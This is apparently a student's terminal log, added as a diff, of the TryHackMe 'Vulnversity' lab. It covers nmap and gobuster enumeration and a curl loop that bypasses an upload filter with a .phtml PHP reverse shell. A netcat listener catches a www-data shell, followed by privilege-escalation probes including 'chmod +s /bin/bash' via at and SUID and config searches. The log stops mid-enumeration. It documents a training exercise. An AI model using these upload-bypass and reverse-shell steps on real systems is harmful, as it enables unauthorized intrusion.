@@ -1,0 +1,1728 @@
+mv bitacora/clase_XX_vulnversity.txt bitacora/clase_10_vulnversity.txt
+┌──(kali㉿kali)-[~/TP_THM]
+└─$ cd ~/TP_THM
+mkdir -p vulnversity
+cd vulnversity
+                                                                                    
+┌──(kali㉿kali)-[~/TP_THM/vulnversity]
+└─$ mkdir -p ../bitacora
+                                                                                    
+┌──(kali㉿kali)-[~/TP_THM/vulnversity]
+└─$ nmap -sC -sV -oN nmap_inicial.txt 10.67.136.59
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-08 10:46 -0400
+Nmap scan report for 10.67.136.59
+Host is up (0.17s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.5
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 49:9b:d8:3c:2a:9c:04:63:b9:6a:e0:ce:de:0e:fe:ba (RSA)
+|   256 9a:9e:50:0b:fc:5d:69:77:9b:3b:5d:68:4d:68:de:e7 (ECDSA)
+|_  256 29:88:ad:4d:2f:53:e2:d9:3d:72:9d:b7:c5:39:a1:d2 (ED25519)
+445/tcp  open  netbios-ssn Samba smbd 4
+3128/tcp open  http-proxy  Squid http proxy 4.10
+|_http-server-header: squid/4.10
+|_http-title: ERROR: The requested URL could not be retrieved
+3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Vuln University
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_nbstat: NetBIOS name: IP-10-67-136-59, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-10-08T14:47:06
+|_  start_date: N/A
+|_clock-skew: -1s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 51.85 seconds
+                                                                                    
+┌──(kali㉿kali)-[~/TP_THM/vulnversity]
+└─$ gobuster dir -u http://10.67.136.59:3333 -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.67.136.59:3333
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+.hta                 (Status: 403) [Size: 279]
+.htaccess            (Status: 403) [Size: 279]
+.htpasswd            (Status: 403) [Size: 279]
+css                  (Status: 301) [Size: 317] [--> http://10.67.136.59:3333/css/]
+fonts                (Status: 301) [Size: 319] [--> http://10.67.136.59:3333/fonts/]
+images               (Status: 301) [Size: 320] [--> http://10.67.136.59:3333/images/]                                                                                   
+internal             (Status: 301) [Size: 322] [--> http://10.67.136.59:3333/internal/]                                                                                 
+index.html           (Status: 200) [Size: 33014]
+js                   (Status: 301) [Size: 316] [--> http://10.67.136.59:3333/js/]
+Progress: 3520 / 4613 (76.31%)[ERROR] error on word pubs: timeout occurred during the request
+server-status        (Status: 403) [Size: 279]
+Progress: 3958 / 4613 (85.80%)[ERROR] error on word shipquote: timeout occurred during the request
+Progress: 4613 / 4613 (100.00%)
+===============================================================
+Finished
+===============================================================
+                                                                                    
+┌──(kali㉿kali)-[~/TP_THM/vulnversity]
+└─$ cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
+                                                                                    
+┌──(kali㉿kali)-[~/TP_THM/vulnversity]
+└─$ ip addr show tun0 | grep inet
+    inet 192.168.151.44/18 brd 192.168.191.255 scope global tun0
+    inet6 fe80::19e:aacc:340:1112/64 scope link stable-privacy proto kernel_ll 
+                                                                                    
+┌──(kali㉿kali)-[~/TP_THM/vulnversity]
+└─$ nano shell.php
+                                                                                    
+┌──(kali㉿kali)-[~/TP_THM/vulnversity]
+└─$ for ext in php php3 php4 php5 php7 phtml pht phar; do
+  cp shell.php shell.$ext
+  echo "Probando .$ext:"
+  curl -s -F "file=@shell.$ext" -F "submit=Submit" http://10.67.136.59:3333/internal/index.php | grep -i -E "success|error|not allowed"
+done
+cp: 'shell.php' and 'shell.php' are the same file
+Probando .php:
+Extension not allowed</body>
+Probando .php3:
+Extension not allowed</body>
+Probando .php4:
+Extension not allowed</body>
+Probando .php5:
+Extension not allowed</body>
+Probando .php7:
+Extension not allowed</body>
+Probando .phtml:
+Success</body>
+Probando .pht:
+Extension not allowed</body>
+Probando .phar:
+Extension not allowed</body>
+                                                                                    
+┌──(kali㉿kali)-[~/TP_THM/vulnversity]
+└─$ curl -s http://10.67.136.59:3333/internal/uploads/shell.phtml
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Connection refused (111)
+                                                                                    
+┌──(kali㉿kali)-[~/TP_THM/vulnversity]
+└─$ gobuster dir -u http://10.67.136.59:3333/internal -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.67.136.59:3333/internal
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+.hta                 (Status: 403) [Size: 279]
+.htaccess            (Status: 403) [Size: 279]
+.htpasswd            (Status: 403) [Size: 279]
+css                  (Status: 301) [Size: 326] [--> http://10.67.136.59:3333/internal/css/]                                                                             
+index.php            (Status: 200) [Size: 525]
+uploads              (Status: 301) [Size: 330] [--> http://10.67.136.59:3333/internal/uploads/]                                                                         
+Progress: 4613 / 4613 (100.00%)
+===============================================================
+Finished
+===============================================================
+                                                                                    
+┌──(kali㉿kali)-[~/TP_THM/vulnversity]
+└─$ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [192.168.151.44] from (UNKNOWN) [10.67.136.59] 49072
+Linux ip-10-67-136-59 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+ 11:35:35 up 51 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@ip-10-67-136-59:/$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/mount
+/bin/umount
+/bin/systemctl
+/bin/fusermount
+/snap/snapd/24505/usr/lib/snapd/snap-confine
+/snap/core20/2582/usr/bin/chfn
+/snap/core20/2582/usr/bin/chsh
+/snap/core20/2582/usr/bin/gpasswd
+/snap/core20/2582/usr/bin/mount
+/snap/core20/2582/usr/bin/newgrp
+/snap/core20/2582/usr/bin/passwd
+/snap/core20/2582/usr/bin/su
+/snap/core20/2582/usr/bin/sudo
+/snap/core20/2582/usr/bin/umount
+/snap/core20/2582/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2582/usr/lib/openssh/ssh-keysign
+/sbin/mount.cifs
+www-data@ip-10-67-136-59:/$ echo "chmod +s /bin/bash" | at now
+echo "chmod +s /bin/bash" | at now
+You do not have permission to use at.
+www-data@ip-10-67-136-59:/$ echo "chmod +s /bin/bash" | at now + 1 minute
+echo "chmod +s /bin/bash" | at now + 1 minute
+You do not have permission to use at.
+www-data@ip-10-67-136-59:/$ sudo -l
+sudo -l
+[sudo] password for www-data: ^C
+                                                                                    
+┌──(kali㉿kali)-[~/TP_THM/vulnversity]
+└─$ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [192.168.151.44] from (UNKNOWN) [10.67.136.59] 57298
+Linux ip-10-67-136-59 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+ 11:41:52 up 57 min,  0 users,  load average: 0.00, 0.03, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@ip-10-67-136-59:/$ find / -writable -type f 2>/dev/null | grep -v "proc\|sys" | head -50
+uname -a
+cat /etc/crontab
+<type f 2>/dev/null | grep -v "proc\|sys" | head -50
+uname -a
+cat /etc/crontab
+/var/www/html/css/css/.DS_Store
+/var/www/html/css/css/mixins/_text-hide.css
+/var/www/html/css/css/bootstrap-reboot.css
+/var/www/html/css/.DS_Store
+/var/www/html/css/bootstrap-datepicker.css
+/var/www/html/css/owl.theme.default.min.css
+/var/www/html/css/owl.carousel.min.css
+/var/www/html/css/bootstrap.min.css
+/var/www/html/css/ajax-loader.gif
+/var/www/html/css/flaticon.css
+/var/www/html/css/icomoon.css
+/var/www/html/css/animate.css
+/var/www/html/css/aos.css
+/var/www/html/css/jquery.timepicker.css
+/var/www/html/css/open-iconic-bootstrap.min.css
+/var/www/html/css/bootstrap/.DS_Store
+/var/www/html/css/bootstrap/bootstrap-grid.css
+/var/www/html/css/bootstrap/bootstrap-reboot.css
+/var/www/html/css/ionicons.min.css
+/var/www/html/css/style.css
+/var/www/html/css/magnific-popup.css
+/var/www/html/js/range.js
+/var/www/html/js/popper.min.js
+/var/www/html/js/owl.carousel.min.js
+/var/www/html/js/bootstrap-datepicker.js
+/var/www/html/js/jquery.stellar.min.js
+/var/www/html/js/google-map.js
+/var/www/html/js/jquery.easing.1.3.js
+/var/www/html/js/.DS_Store
+/var/www/html/js/main.js
+/var/www/html/js/aos.js
+/var/www/html/js/bootstrap.min.js
+/var/www/html/js/jquery.timepicker.min.js
+/var/www/html/js/jquery-3.2.1.min.js
+/var/www/html/js/jquery.min.js
+/var/www/html/js/jquery.animateNumber.min.js
+/var/www/html/js/jquery.magnific-popup.min.js
+/var/www/html/js/scrollax.min.js
+/var/www/html/js/jquery.waypoints.min.js
+/var/www/html/js/jquery-migrate-3.0.1.min.js
+/var/www/html/index.html
+/var/www/html/fonts/flaticon/license/license.pdf
+/var/www/html/fonts/flaticon/.DS_Store
+/var/www/html/fonts/flaticon/backup.txt
+/var/www/html/fonts/flaticon/font/flaticon.html
+/var/www/html/fonts/flaticon/font/_flaticon.scss
+/var/www/html/fonts/flaticon/font/flaticon.css
+/var/www/html/fonts/flaticon/font/Flaticon.eot
+/var/www/html/fonts/flaticon/font/Flaticon.ttf
+/var/www/html/fonts/flaticon/font/Flaticon.woff
+grep: write error: Broken pipe
+www-data@ip-10-67-136-59:/$ uname -a
+Linux ip-10-67-136-59 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+www-data@ip-10-67-136-59:/$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+www-data@ip-10-67-136-59:/$ find / -type f -exec getcap {} \; 2>/dev/null
+<ron.d/find / -type f -exec getcap {} \; 2>/dev/null
+www-data@ip-10-67-136-59:/$ find / -name "*.conf" -o -name "config.php" -o -name "wp-config.php" 2>/dev/null | grep -v proc
+cat /var/www/html/internal/*.php 2>/dev/null
+<-o -name "wp-config.php" 2>/dev/null | grep -v proc
+
+cat /var/www/html/internal/*.php 2>/dev/null
+ls -la /var/www/html/internal/
+/usr/src/linux-headers-5.4.0-216-generic/include/config/tristate.conf
+/usr/src/linux-headers-5.4.0-216-generic/include/config/auto.conf
+/usr/src/linux-headers-4.15.0-213-generic/include/config/tristate.conf
+/usr/src/linux-headers-4.15.0-213-generic/include/config/auto.conf
+/usr/src/linux-headers-4.4.0-142-generic/include/config/tristate.conf
+/usr/src/linux-headers-4.4.0-142-generic/include/config/auto.conf
+/usr/src/linux-headers-4.4.0-210-generic/include/config/tristate.conf
+/usr/src/linux-headers-4.4.0-210-generic/include/config/auto.conf
+/usr/src/linux-headers-5.15.0-139-generic/include/config/auto.conf
+/usr/share/dnsmasq-base/trust-anchors.conf
+/usr/share/libc-bin/nsswitch.conf
+/usr/share/rsyslog/50-default.conf
+/usr/share/alsa/alsa.conf
+/usr/share/alsa/pcm/surround21.conf
+/usr/share/alsa/pcm/dmix.conf
+/usr/share/alsa/pcm/modem.conf
+/usr/share/alsa/pcm/hdmi.conf
+/usr/share/alsa/pcm/surround71.conf
+/usr/share/alsa/pcm/surround50.conf
+/usr/share/alsa/pcm/rear.conf
+/usr/share/alsa/pcm/default.conf
+/usr/share/alsa/pcm/dsnoop.conf
+/usr/share/alsa/pcm/center_lfe.conf
+/usr/share/alsa/pcm/surround51.conf
+/usr/share/alsa/pcm/side.conf
+/usr/share/alsa/pcm/surround41.conf
+/usr/share/alsa/pcm/iec958.conf
+/usr/share/alsa/pcm/dpl.conf
+/usr/share/alsa/pcm/front.conf
+/usr/share/alsa/pcm/surround40.conf
+/usr/share/alsa/cards/NFORCE.conf
+/usr/share/alsa/cards/ENS1370.conf
+/usr/share/alsa/cards/USB-Audio.conf
+/usr/share/alsa/cards/ATIIXP.conf
+/usr/share/alsa/cards/CMI8738-MC8.conf
+/usr/share/alsa/cards/CMI8338-SWIEC.conf
+/usr/share/alsa/cards/Aureon71.conf
+/usr/share/alsa/cards/CS46xx.conf
+/usr/share/alsa/cards/TRID4DWAVENX.conf
+/usr/share/alsa/cards/FireWave.conf
+/usr/share/alsa/cards/Echo_Echo3G.conf
+/usr/share/alsa/cards/AU8810.conf
+/usr/share/alsa/cards/Maestro3.conf
+/usr/share/alsa/cards/VIA8233A.conf
+/usr/share/alsa/cards/RME9652.conf
+/usr/share/alsa/cards/PMacToonie.conf
+/usr/share/alsa/cards/PS3.conf
+/usr/share/alsa/cards/HdmiLpeAudio.conf
+/usr/share/alsa/cards/AU8830.conf
+/usr/share/alsa/cards/ATIIXP-MODEM.conf
+/usr/share/alsa/cards/Audigy2.conf
+/usr/share/alsa/cards/VIA686A.conf
+/usr/share/alsa/cards/RME9636.conf
+/usr/share/alsa/cards/ENS1371.conf
+/usr/share/alsa/cards/VIA8237.conf
+/usr/share/alsa/cards/PMac.conf
+/usr/share/alsa/cards/Audigy.conf
+/usr/share/alsa/cards/VIA8233.conf
+/usr/share/alsa/cards/FWSpeakers.conf
+/usr/share/alsa/cards/Loopback.conf
+/usr/share/alsa/cards/EMU10K1.conf
+/usr/share/alsa/cards/ES1968.conf
+/usr/share/alsa/cards/ATIIXP-SPDMA.conf
+/usr/share/alsa/cards/YMF744.conf
+/usr/share/alsa/cards/FM801.conf
+/usr/share/alsa/cards/Aureon51.conf
+/usr/share/alsa/cards/ICH-MODEM.conf
+/usr/share/alsa/cards/CA0106.conf
+/usr/share/alsa/cards/GUS.conf
+/usr/share/alsa/cards/AU8820.conf
+/usr/share/alsa/cards/ICH.conf
+/usr/share/alsa/cards/pistachio-card.conf
+/usr/share/alsa/cards/ICE1724.conf
+/usr/share/alsa/cards/SI7018.conf
+/usr/share/alsa/cards/ICH4.conf
+/usr/share/alsa/cards/aliases.conf
+/usr/share/alsa/cards/CMI8738-MC6.conf
+/usr/share/alsa/cards/HDA-Intel.conf
+/usr/share/alsa/cards/VX222.conf
+/usr/share/alsa/cards/ICE1712.conf
+/usr/share/alsa/cards/SB-XFi.conf
+/usr/share/alsa/cards/PC-Speaker.conf
+/usr/share/alsa/cards/VXPocket.conf
+/usr/share/alsa/cards/EMU10K1X.conf
+/usr/share/alsa/cards/VXPocket440.conf
+/usr/share/alsa/cards/AACI.conf
+/usr/share/alsa/cards/CMI8788.conf
+/usr/share/alsa/cards/CMI8338.conf
+/usr/share/alsa/cards/vc4-hdmi.conf
+/usr/share/debconf/debconf.conf
+/usr/share/squid/mime.conf
+/usr/share/samba/smb.conf
+/usr/share/samba/setup/named.conf
+/usr/share/samba/setup/krb5.conf
+/usr/share/dbus-1/session.conf
+/usr/share/dbus-1/system.conf
+/usr/share/dbus-1/system.d/org.freedesktop.locale1.conf
+/usr/share/dbus-1/system.d/io.netplan.Netplan.conf
+/usr/share/dbus-1/system.d/org.freedesktop.timedate1.conf
+/usr/share/dbus-1/system.d/org.freedesktop.systemd1.conf
+/usr/share/dbus-1/system.d/snapd.system-services.conf
+/usr/share/dbus-1/system.d/org.freedesktop.resolve1.conf
+/usr/share/dbus-1/system.d/org.freedesktop.network1.conf
+/usr/share/dbus-1/system.d/org.freedesktop.login1.conf
+/usr/share/dbus-1/system.d/com.canonical.UbuntuAdvantage.conf
+/usr/share/dbus-1/system.d/org.freedesktop.UPower.conf
+/usr/share/dbus-1/system.d/org.freedesktop.hostname1.conf
+/usr/share/dbus-1/system.d/org.freedesktop.timesync1.conf
+/usr/share/dbus-1/system.d/org.freedesktop.PolicyKit1.conf
+/usr/share/dbus-1/session.d/snapd.session-services.conf
+/usr/share/ufw/ufw.conf
+/usr/share/pastebin.d/slexy.org.conf
+/usr/share/pastebin.d/paste.debian.net.conf
+/usr/share/pastebin.d/sprunge.us.conf
+/usr/share/pastebin.d/fpaste.org.conf
+/usr/share/pastebin.d/paste.openstack.org.conf
+/usr/share/pastebin.d/paste.ubuntu.org.cn.conf
+/usr/share/pastebin.d/paste.pound-python.org.conf
+/usr/share/pastebin.d/dpaste.com.conf
+/usr/share/pastebin.d/p.defau.lt.conf
+/usr/share/pastebin.d/paste.ubuntu.com.conf
+/usr/share/pastebin.d/paste2.org.conf
+/usr/share/pastebin.d/pastebin.com.conf
+/usr/share/adduser/adduser.conf
+/usr/share/lxc/config/common.conf
+/usr/share/lxc/config/userns.conf
+/usr/share/lxc/config/common.conf.d/00-lxcfs.conf
+/usr/share/lxc/config/nesting.conf
+/usr/share/lxc/config/oci.common.conf
+/usr/share/popularity-contest/default.conf
+/usr/share/byobu/keybindings/tmux-screen-keys.conf
+/usr/share/doc/liblxc-common/examples/lxc-no-netns.conf
+/usr/share/doc/liblxc-common/examples/lxc-empty-netns.conf
+/usr/share/doc/liblxc-common/examples/lxc-complex.conf
+/usr/share/doc/liblxc-common/examples/seccomp-v1.conf
+/usr/share/doc/liblxc-common/examples/lxc-veth.conf
+/usr/share/doc/liblxc-common/examples/seccomp-v2-denylist.conf
+/usr/share/doc/liblxc-common/examples/lxc-phys.conf
+/usr/share/doc/liblxc-common/examples/lxc-macvlan.conf
+/usr/share/doc/liblxc-common/examples/seccomp-v2.conf
+/usr/share/doc/liblxc-common/examples/lxc-vlan.conf
+/usr/share/doc/gnupg/examples/gpgconf.conf
+/usr/share/doc/rsyslog/examples/rsyslog.d/console.conf
+/usr/share/doc/rsyslog/examples/rsyslog.d/xconsole.conf
+/usr/share/doc/rsyslog/examples/tmpfiles.d/xconsole.conf
+/usr/share/doc/rsync/examples/rsyncd.conf
+/usr/share/doc/apt-utils/examples/ftp-archive.conf
+/usr/share/doc/apt-utils/examples/apt-ftparchive.conf
+/usr/share/doc/samba/examples/logon/mklogon/mklogon.conf
+/usr/share/doc/samba/examples/logon/ntlogon/ntlogon.conf
+/usr/share/doc/adduser/examples/adduser.local.conf
+/usr/share/doc/adduser/examples/adduser.local.conf.examples/adduser.conf
+/usr/share/doc/apt/examples/apt.conf
+/usr/share/doc/sudo/examples/syslog.conf
+/usr/share/doc/sudo/examples/sudo.conf
+/usr/share/doc/sudo/examples/pam.conf
+/usr/share/doc/tmux/example_tmux.conf
+/usr/share/doc/busybox-static/examples/mdev.conf
+/usr/share/doc/vsftpd/examples/INTERNET_SITE_NOINETD/vsftpd.conf
+/usr/share/doc/vsftpd/examples/INTERNET_SITE/vsftpd.conf
+/usr/share/doc/vsftpd/examples/VIRTUAL_USERS/vsftpd.conf
+/usr/share/doc/libcups2/examples/client.conf
+/usr/share/doc/gpgconf/examples/gpgconf.conf
+/usr/lib/systemd/logind.conf.d/unattended-upgrades-logind-maxdelay.conf
+/usr/lib/sysusers.d/dbus.conf
+/usr/lib/sysusers.d/systemd.conf
+/usr/lib/sysusers.d/basic.conf
+/usr/lib/initramfs-tools/etc/dhcp/dhclient.conf
+/usr/lib/python3/dist-packages/fail2ban/tests/files/filter.d/testcase-common.conf
+/usr/lib/python3/dist-packages/fail2ban/tests/files/filter.d/testcase01.conf
+/usr/lib/python3/dist-packages/fail2ban/tests/files/filter.d/substition.conf
+/usr/lib/python3/dist-packages/fail2ban/tests/config/filter.d/zzz-generic-example.conf
+/usr/lib/python3/dist-packages/fail2ban/tests/config/filter.d/simple.conf
+/usr/lib/python3/dist-packages/fail2ban/tests/config/filter.d/test.conf
+/usr/lib/python3/dist-packages/fail2ban/tests/config/filter.d/zzz-sshd-obsolete-multiline.conf
+/usr/lib/python3/dist-packages/fail2ban/tests/config/fail2ban.conf
+/usr/lib/python3/dist-packages/fail2ban/tests/config/jail.conf
+/usr/lib/python3/dist-packages/fail2ban/tests/config/action.d/action.conf
+/usr/lib/python3/dist-packages/fail2ban/tests/config/action.d/brokenaction.conf
+/usr/lib/environment.d/99-environment.conf
+/usr/lib/environment.d/990-snapd.conf
+/usr/lib/tmpfiles.d/resolvconf.conf
+/usr/lib/tmpfiles.d/screen-cleanup.conf
+/usr/lib/tmpfiles.d/static-nodes-permissions.conf
+/usr/lib/tmpfiles.d/snapd.conf
+/usr/lib/tmpfiles.d/systemd-tmp.conf
+/usr/lib/tmpfiles.d/x11.conf
+/usr/lib/tmpfiles.d/sudo.conf
+/usr/lib/tmpfiles.d/dbus.conf
+/usr/lib/tmpfiles.d/debian.conf
+/usr/lib/tmpfiles.d/systemd.conf
+/usr/lib/tmpfiles.d/legacy.conf
+/usr/lib/tmpfiles.d/man-db.conf
+/usr/lib/tmpfiles.d/vsftpd.conf
+/usr/lib/tmpfiles.d/squid.conf
+/usr/lib/tmpfiles.d/passwd.conf
+/usr/lib/tmpfiles.d/php7.0-fpm.conf
+/usr/lib/tmpfiles.d/lvm2.conf
+/usr/lib/tmpfiles.d/journal-nocow.conf
+/usr/lib/tmpfiles.d/samba.conf
+/usr/lib/tmpfiles.d/00rsyslog.conf
+/usr/lib/tmpfiles.d/fail2ban-tmpfiles.conf
+/usr/lib/tmpfiles.d/var.conf
+/usr/lib/tmpfiles.d/home.conf
+/usr/lib/tmpfiles.d/tmp.conf
+/usr/lib/tmpfiles.d/cryptsetup.conf
+/usr/lib/tmpfiles.d/systemd-nologin.conf
+/usr/lib/tmpfiles.d/apport.conf
+/usr/lib/sysctl.d/50-default.conf
+/usr/lib/sysctl.d/50-pid-max.conf
+/usr/lib/sysctl.d/protect-links.conf
+/run/resolvconf/resolv.conf
+/run/tmpfiles.d/static-nodes.conf
+/run/NetworkManager/conf.d/netplan.conf
+/run/systemd/resolve/stub-resolv.conf
+/run/systemd/resolve/resolv.conf
+/etc/mke2fs.conf
+/etc/resolv.conf
+/etc/rsyslog.conf
+/etc/request-key.conf
+/etc/debconf.conf
+/etc/request-key.d/cifs.idmap.conf
+/etc/request-key.d/cifs.spnego.conf
+/etc/apport/crashdb.conf
+/etc/host.conf
+/etc/updatedb.conf
+/etc/xattr.conf
+/etc/sos/sos.conf
+/etc/security/sepermit.conf
+/etc/security/access.conf
+/etc/security/namespace.conf
+/etc/security/limits.conf
+/etc/security/group.conf
+/etc/security/pam_env.conf
+/etc/security/faillock.conf
+/etc/security/time.conf
+/etc/fonts/conf.d/69-language-selector-zh-mo.conf
+/etc/fonts/conf.d/30-cjk-aliases.conf
+/etc/fonts/conf.d/99-language-selector-zh.conf
+/etc/fonts/conf.d/69-language-selector-ja.conf
+/etc/fonts/conf.d/69-language-selector-zh-tw.conf
+/etc/fonts/conf.d/69-language-selector-zh-cn.conf
+/etc/fonts/conf.d/69-language-selector-zh-sg.conf
+/etc/fonts/conf.d/69-language-selector-zh-hk.conf
+/etc/fonts/conf.d/56-language-selector-ar.conf
+/etc/fonts/conf.d/64-language-selector-prefer.conf
+/etc/fonts/conf.avail/69-language-selector-zh-mo.conf
+/etc/fonts/conf.avail/30-cjk-aliases.conf
+/etc/fonts/conf.avail/99-language-selector-zh.conf
+/etc/fonts/conf.avail/69-language-selector-ja.conf
+/etc/fonts/conf.avail/69-language-selector-zh-tw.conf
+/etc/fonts/conf.avail/69-language-selector-zh-cn.conf
+/etc/fonts/conf.avail/69-language-selector-zh-sg.conf
+/etc/fonts/conf.avail/69-language-selector-zh-hk.conf
+/etc/fonts/conf.avail/56-language-selector-ar.conf
+/etc/fonts/conf.avail/64-language-selector-prefer.conf
+/etc/init/hostname.sh.conf
+/etc/init/php7.0-fpm.conf
+/etc/init/hostname.conf
+/etc/popularity-contest.conf
+/etc/dhcp/dhclient.conf
+/etc/udev/udev.conf
+/etc/ldap/ldap.conf
+/etc/hdparm.conf
+/etc/ld.so.conf.d/x86_64-linux-gnu.conf
+/etc/ld.so.conf.d/libc.conf
+/etc/lvm/lvm.conf
+/etc/lvm/lvmlocal.conf
+/etc/ld.so.conf
+/etc/systemd/pstore.conf
+/etc/systemd/system.conf
+/etc/systemd/networkd.conf
+/etc/systemd/journald.conf
+/etc/systemd/user.conf
+/etc/systemd/resolved.conf
+/etc/systemd/sleep.conf
+/etc/systemd/logind.conf
+/etc/systemd/timesyncd.conf
+/etc/fuse.conf
+/etc/modprobe.d/amd64-microcode-blacklist.conf
+/etc/modprobe.d/iwlwifi.conf
+/etc/modprobe.d/blacklist-framebuffer.conf
+/etc/modprobe.d/intel-microcode-blacklist.conf
+/etc/modprobe.d/blacklist-rare-network.conf
+/etc/modprobe.d/blacklist.conf
+/etc/modprobe.d/blacklist-ath_pci.conf
+/etc/modprobe.d/blacklist-watchdog.conf
+/etc/modprobe.d/blacklist-firewire.conf
+/etc/modprobe.d/mdadm.conf
+/etc/UPower/UPower.conf
+/etc/modules-load.d/modules.conf
+/etc/insserv.conf
+/etc/vsftpd.conf
+/etc/pam.conf
+/etc/nsswitch.conf
+/etc/ltrace.conf
+/etc/gai.conf
+/etc/squid/conf.d/debian.conf
+/etc/squid/squid.conf
+/etc/adduser.conf
+/etc/deluser.conf
+/etc/samba/smb.conf
+/etc/e2scrub.conf
+/etc/logrotate.conf
+/etc/mdadm/mdadm.conf
+/etc/dbus-1/system.d/dnsmasq.conf
+/etc/dbus-1/system.d/com.ubuntu.LanguageSelector.conf
+/etc/dbus-1/system.d/org.freedesktop.thermald.conf
+/etc/dbus-1/system.d/org.freedesktop.Accounts.conf
+/etc/dbus-1/system.d/com.ubuntu.SoftwareProperties.conf
+/etc/dbus-1/system.d/org.freedesktop.PackageKit.conf
+/etc/ufw/ufw.conf
+/etc/ufw/sysctl.conf
+/etc/kernel-img.conf
+/etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+/etc/polkit-1/localauthority.conf.d/50-localauthority.conf
+/etc/selinux/semanage.conf
+/etc/rsyslog.d/50-default.conf
+/etc/rsyslog.d/20-ufw.conf
+/etc/rsyslog.d/21-cloudinit.conf
+/etc/ucf.conf
+/etc/sos.conf
+/etc/ubuntu-advantage/uaclient.conf
+/etc/initramfs-tools/initramfs.conf
+/etc/initramfs-tools/update-initramfs.conf
+/etc/apt/apt.conf.d/20snapd.conf
+/etc/apt/apt.conf.d/20apt-esm-hook.conf
+/etc/libaudit.conf
+/etc/ca-certificates.conf
+/etc/apache2/sites-enabled/000-default.conf
+/etc/apache2/sites-available/default-ssl.conf
+/etc/apache2/sites-available/000-default.conf
+/etc/apache2/conf-available/serve-cgi-bin.conf
+/etc/apache2/conf-available/other-vhosts-access-log.conf
+/etc/apache2/conf-available/charset.conf
+/etc/apache2/conf-available/security.conf
+/etc/apache2/conf-available/php7.0-fpm.conf
+/etc/apache2/conf-available/localized-error-pages.conf
+/etc/apache2/mods-enabled/negotiation.conf
+/etc/apache2/mods-enabled/php7.0.conf
